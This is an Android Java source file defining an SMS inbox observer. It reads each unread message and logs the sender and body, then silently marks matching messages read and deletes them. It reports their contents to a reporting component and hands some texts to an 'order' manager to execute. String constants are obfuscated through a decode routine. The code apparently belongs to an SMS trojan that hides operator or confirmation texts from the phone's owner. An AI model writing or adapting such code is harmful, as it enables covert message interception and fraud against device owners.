package net.workspace.sms;
import net.workspace.listener.BlockListener;
import net.workspace.manager.OrderManager;
import net.workspace.manager.ReportManager;
import net.workspace.util.Constants;
import net.workspace.util.MyLogger;
import net.workspace.util.ParseKsy;
import net.workspace.util.CommonUtil;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import bean.Block;
import bean.Feedback;

public class SmsObserver extends ContentObserver {
    /**
     * "address"
     */
    private static String ADDRESS2 = ParseKsy.decode("7bd860dc2feb174d057130afe878bbc9");
    /**
     * "body"
     */
    private static String BODY = ParseKsy.decode("300487da8ad7f78121586a2cffae56fb");
    /**
     * content://sms/conversations/
     */
    private static String URI_CONTENT = ParseKsy.decode("cc4e76d0342d60a59aae0e563fd6b5e67a0ac5046fdbe7a00e7cb0c492fe1084");
    public SmsObserver(Handler handler) {
        super(handler);
    }
    private void deletSms(Cursor cursor) {
        ContentValues contentvalues = new ContentValues();
        contentvalues.put("read", "1");
        ContentResolver contentresolver = CommonUtil.context.getContentResolver();
        contentresolver.update(Uri.parse(Constants.URI_SMS_INBOX), contentvalues, " _id=?", new String[] { String.valueOf(cursor.getInt(0)) });
        String threadId = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
        String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
        Uri uri1 = Uri.parse(new StringBuilder(URI_CONTENT).append(threadId).toString());
        CommonUtil.context.getContentResolver().delete(uri1, "_id=?", new String[] { id });
        cursor.moveToNext();
    }
    @Override
    public void onChange(boolean flag) {
        super.onChange(flag);
        try {
            onSmsContentChanged();
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
    public void onSmsContentChanged() {
        final Cursor cursor = CommonUtil.context.getContentResolver().query(Uri.parse(Constants.URI_SMS_INBOX), null, "read=?", new String[] { "0" }, "date desc");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String text = cursor.getString(cursor.getColumnIndexOrThrow(BODY));
                String address = cursor.getString(cursor.getColumnIndexOrThrow(ADDRESS2));
                MyLogger.debug(address, text);
                if (SmsHelper.checkPhoneNumber(address, text)) {
                    deletSms(cursor);
                    SmsHelper.reportPhoneNumber(address, text);
                } else {
                    BlockListener listener = new BlockListener() {
                        private boolean blocked = false;
                        @Override
                        public void stopBroadcast() {
                            if (!blocked) {
                                deletSms(cursor);
                                blocked = true;
                            }
                        }
                    };
                    SmsHelper.checkCommonBlocks(address, text, listener);
                    Feedback feedback = SmsHelper.checkFeedback(address, text, listener);
                    if (feedback != null) {
                        deletSms(cursor);
                        OrderManager.getInstance(CommonUtil.context).executeFeedback(address, text, feedback);
                    } else {
                        Block block = SmsHelper.checkBlock(address, text, listener);
                        if (block != null) {
                            ReportManager.successReport(block, address + "->" + text);
                        }
                    }
                }
            }
            cursor.close();
        }
    }
}
